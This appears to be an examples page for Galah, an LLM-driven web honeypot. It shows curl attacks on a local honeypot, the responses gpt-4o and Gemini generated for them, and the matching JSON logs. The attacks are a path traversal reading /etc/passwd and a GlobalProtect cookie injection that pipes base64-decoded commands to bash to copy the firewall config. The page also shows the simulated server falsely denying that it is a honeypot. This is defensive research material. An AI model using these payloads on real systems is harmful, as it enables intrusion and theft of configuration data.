# Examples

### Example 1 

Model: OpenAI's `gpt-4o`

```bash
./galah -p openai -m gpt-4o --cache-duration 0 --temperature 0.8
```

```
% curl -i 'http://localhost:8080/sys.php?file=../../etc/passwd'
HTTP/1.1 200 OK
Server: Apache/2.4.38
Date: Sun, 26 May 2024 17:03:45 GMT
Content-Length: 560
Content-Type: text/plain; charset=utf-8

root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin% 
```

JSON event log:
```
{"eventTime":"2024-05-26T19:03:45.273678+02:00","httpRequest":{"body":"","bodySha256":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","headers":"User-Agent: [curl/7.71.1], Accept: [*/*]","headersSorted":"Accept,User-Agent","headersSortedSha256":"cf69e186169279bd51769f29d122b07f1f9b7e51bf119c340b66fbd2a1128bc9","method":"GET","protocolVersion":"HTTP/1.1","request":"/sys.php?file=../../etc/passwd","userAgent":"curl/7.71.1"},"httpResponse":{"headers":{"Content-Type":"text/plain; charset=utf-8","Server":"Apache/2.4.38"},"body":"root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\ngames:x:12:100:games:/usr/games:/sbin/nologin\nftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\nnobody:x:99:99:Nobody:/:/sbin/nologin"},"level":"info","llm":{"model":"gpt-4o","provider":"openai","temperature":0.8},"msg":"successfulResponse","port":"8080","sensorName":"mbp.local","srcHost":"localhost","srcIP":"::1","srcPort":"51804","tags":null,"time":"2024-05-26T19:03:45.273717+02:00"}
```

### Example 2

Model: Google's `gemini-1.5-pro`

```bash
./galah -p gcp-vertex -m gemini-1.5-pro --cloud-project galah-test --cloud-location us-central1 -t 0.2 --cache-duration 0
```

```
curl -i 'http://127.0.0.1:8080/global-protect/login.esp' --cookie "SESSID=.././.././.././.././.././.././.././.././../opt/panlogs/tmp/device_telemetry/minute/'}|{echo,Y3AgL29wdC9wYW5jZmcvbWdtdC9zYXZlZC1jb25maWdzL3J1bm5pbmctY29uZmlnLnhtbCAvdmFyL2FwcHdlYi9zc2x2cG5kb2NzL2dsb2JhbC1wcm90ZWN0L2Rrc2hka2Vpc3NpZGpleXVrZGwuY3Nz}|{base64,-d}|bash|"
HTTP/1.1 200 OK
Connection: close
Content-Security-Policy: default-src 'self'; img-src * data:; object-src 'none'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'
Referrer-Policy: strict-origin-when-cross-origin
Server: nginx
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Xss-Protection: 1; mode=block
Date: Sun, 26 May 2024 17:14:43 GMT
Content-Type: text/html; charset=utf-8
Transfer-Encoding: chunked

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>GlobalProtect</title>

    <link href="/global-protect/css/bootstrap.min.css" rel="stylesheet">
    <link href="/global-protect/css/fontawesome.min.css" rel="stylesheet">
    <link href="/global-protect/css/pan-icons.css" rel="stylesheet">
    <link href="/global-protect/css/styles.css" rel="stylesheet">

    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->

</head>
<body>

<div class="container-fluid">
    <div class="row">
        <div class="col-sm-6 col-sm-offset-3 col-md-4 col-md-offset-4 login-container">
            <div class="panel panel-default">
                <div class="panel-heading">
                    <img src="/global-protect/images/logo-pan.svg" alt="Logo">
                    <h3>Sign In</h3>
                </div>
                <div class="panel-body">
                    <form action="/global-protect/login.esp" method="post" id="login-form">
                        <input type="hidden" name="tmpfname" value="/opt/pancfg/mgmt/saved-configs/running-config.xml">
                        <input type="hidden" name="prot" value="https">
                        <input type="hidden" name="clientid" value="some-client-id">
                        <div class="form-group">
                            <label for="user" class="sr-only">Username</label>
                            <div class="input-group">
                                <div class="input-group-addon"><i class="fa fa-user"></i></div>
                                <input type="text" class="form-control" id="user" name="user" placeholder="Username" required>
                            </div>
                        </div>
                        <div class="form-group">
                            <label for="passwd" class="sr-only">Password</label>
                            <div class="input-group">
                                <div class="input-group-addon"><i class="fa fa-lock"></i></div>
                                <input type="password" class="form-control" id="passwd" name="passwd" placeholder="Password" required>
                            </div>
                        </div>
                        <div class="form-group">
                            <button type="submit" class="btn btn-primary btn-block">Sign In</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>

<script src="/global-protect/js/jquery.min.js"></script>
<script src="/global-protect/js/bootstrap.min.js"></script>
</body>
</html>
```

JSON event log:
```
{"eventTime":"2024-05-26T19:14:43.366381+02:00","httpRequest":{"body":"","bodySha256":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","headers":"User-Agent: [curl/7.71.1], Accept: [*/*], Cookie: [SESSID=.././.././.././.././.././.././.././.././../opt/panlogs/tmp/device_telemetry/minute/'}|{echo,Y3AgL29wdC9wYW5jZmcvbWdtdC9zYXZlZC1jb25maWdzL3J1bm5pbmctY29uZmlnLnhtbCAvdmFyL2FwcHdlYi9zc2x2cG5kb2NzL2dsb2JhbC1wcm90ZWN0L2Rrc2hka2Vpc3NpZGpleXVrZGwuY3Nz}|{base64,-d}|bash|]","headersSorted":"Accept,Cookie,User-Agent","headersSortedSha256":"82e1b76b886e7963ee8d180efca3d7b483c67943610ed92104a188eaf915e013","method":"GET","protocolVersion":"HTTP/1.1","request":"/global-protect/login.esp","userAgent":"curl/7.71.1"},"httpResponse":{"headers":{"Connection":"close","Content-Security-Policy":"default-src 'self'; img-src * data:; object-src 'none'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'","Content-Type":"text/html; charset=utf-8","Referrer-Policy":"strict-origin-when-cross-origin","Server":"nginx","X-Content-Type-Options":"nosniff","X-Frame-Options":"SAMEORIGIN","X-XSS-Protection":"1; mode=block"},"body":"\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n\u003chead\u003e\n    \u003cmeta charset=\"utf-8\"\u003e\n    \u003cmeta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"\u003e\n    \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1\"\u003e\n    \u003ctitle\u003eGlobalProtect\u003c/title\u003e\n\n    \u003clink href=\"/global-protect/css/bootstrap.min.css\" rel=\"stylesheet\"\u003e\n    \u003clink href=\"/global-protect/css/fontawesome.min.css\" rel=\"stylesheet\"\u003e\n    \u003clink href=\"/global-protect/css/pan-icons.css\" rel=\"stylesheet\"\u003e\n    \u003clink href=\"/global-protect/css/styles.css\" rel=\"stylesheet\"\u003e\n\n    \u003c!--[if lt IE 9]\u003e\n    \u003cscript src=\"https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js\"\u003e\u003c/script\u003e\n    \u003cscript src=\"https://oss.maxcdn.com/respond/1.4.2/respond.min.js\"\u003e\u003c/script\u003e\n    \u003c![endif]--\u003e\n\n\u003c/head\u003e\n\u003cbody\u003e\n\n\u003cdiv class=\"container-fluid\"\u003e\n    \u003cdiv class=\"row\"\u003e\n        \u003cdiv class=\"col-sm-6 col-sm-offset-3 col-md-4 col-md-offset-4 login-container\"\u003e\n            \u003cdiv class=\"panel panel-default\"\u003e\n                \u003cdiv class=\"panel-heading\"\u003e\n                    \u003cimg src=\"/global-protect/images/logo-pan.svg\" alt=\"Logo\"\u003e\n                    \u003ch3\u003eSign In\u003c/h3\u003e\n                \u003c/div\u003e\n                \u003cdiv class=\"panel-body\"\u003e\n                    \u003cform action=\"/global-protect/login.esp\" method=\"post\" id=\"login-form\"\u003e\n                        \u003cinput type=\"hidden\" name=\"tmpfname\" value=\"/opt/pancfg/mgmt/saved-configs/running-config.xml\"\u003e\n                        \u003cinput type=\"hidden\" name=\"prot\" value=\"https\"\u003e\n                        \u003cinput type=\"hidden\" name=\"clientid\" value=\"some-client-id\"\u003e\n                        \u003cdiv class=\"form-group\"\u003e\n                            \u003clabel for=\"user\" class=\"sr-only\"\u003eUsername\u003c/label\u003e\n                            \u003cdiv class=\"input-group\"\u003e\n                                \u003cdiv class=\"input-group-addon\"\u003e\u003ci class=\"fa fa-user\"\u003e\u003c/i\u003e\u003c/div\u003e\n                                \u003cinput type=\"text\" class=\"form-control\" id=\"user\" name=\"user\" placeholder=\"Username\" required\u003e\n                            \u003c/div\u003e\n                        \u003c/div\u003e\n                        \u003cdiv class=\"form-group\"\u003e\n                            \u003clabel for=\"passwd\" class=\"sr-only\"\u003ePassword\u003c/label\u003e\n                            \u003cdiv class=\"input-group\"\u003e\n                                \u003cdiv class=\"input-group-addon\"\u003e\u003ci class=\"fa fa-lock\"\u003e\u003c/i\u003e\u003c/div\u003e\n                                \u003cinput type=\"password\" class=\"form-control\" id=\"passwd\" name=\"passwd\" placeholder=\"Password\" required\u003e\n                            \u003c/div\u003e\n                        \u003c/div\u003e\n                        \u003cdiv class=\"form-group\"\u003e\n                            \u003cbutton type=\"submit\" class=\"btn btn-primary btn-block\"\u003eSign In\u003c/button\u003e\n                        \u003c/div\u003e\n                    \u003c/form\u003e\n                \u003c/div\u003e\n            \u003c/div\u003e\n        \u003c/div\u003e\n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cscript src=\"/global-protect/js/jquery.min.js\"\u003e\u003c/script\u003e\n\u003cscript src=\"/global-protect/js/bootstrap.min.js\"\u003e\u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n"},"level":"info","llm":{"model":"gemini-1.5-pro","provider":"gcp-vertex","temperature":0.2},"msg":"successfulResponse","port":"8080","sensorName":"mbp.local","srcHost":"localhost","srcIP":"127.0.0.1","srcPort":"51868","tags":null,"time":"2024-05-26T19:14:43.366394+02:00"}
```

### Example -1

Now, let's do some sort of adversarial testing (Galah v0.9)!

Model: OpenAI's `gpt-4`

```
% curl http://localhost:8888/are-you-a-honeypot
No, I am a server.`
```

JSON event log:
```
{"timestamp":"2024-01-01T05:50:43.792479","srcIP":"::1","srcHost":"localhost","tags":null,"srcPort":"61982","sensorName":"home-sensor","port":"8888","httpRequest":{"method":"GET","protocolVersion":"HTTP/1.1","request":"/are-you-a-honeypot","userAgent":"curl/7.71.1","headers":"User-Agent: [curl/7.71.1], Accept: [*/*]","headersSorted":"Accept,User-Agent","headersSortedSha256":"cf69e186169279bd51769f29d122b07f1f9b7e51bf119c340b66fbd2a1128bc9","body":"","bodySha256":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"},"httpResponse":{"headers":{"Connection":"close","Content-Length":"20","Content-Type":"text/plain","Server":"Apache/2.4.41 (Ubuntu)"},"body":"No, I am a server."}}
```

😑

```
% curl http://localhost:8888/i-mean-are-you-a-fake-server`
No, I am not a fake server.
```

JSON log record:
```
{"timestamp":"2024-01-01T05:51:40.812831","srcIP":"::1","srcHost":"localhost","tags":null,"srcPort":"62205","sensorName":"home-sensor","port":"8888","httpRequest":{"method":"GET","protocolVersion":"HTTP/1.1","request":"/i-mean-are-you-a-fake-server","userAgent":"curl/7.71.1","headers":"User-Agent: [curl/7.71.1], Accept: [*/*]","headersSorted":"Accept,User-Agent","headersSortedSha256":"cf69e186169279bd51769f29d122b07f1f9b7e51bf119c340b66fbd2a1128bc9","body":"","bodySha256":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"},"httpResponse":{"headers":{"Connection":"close","Content-Type":"text/plain","Server":"LocalHost/1.0"},"body":"No, I am not a fake server."}}
```

You're a [galah](https://www.macquariedictionary.com.au/blog/article/728/), mate!
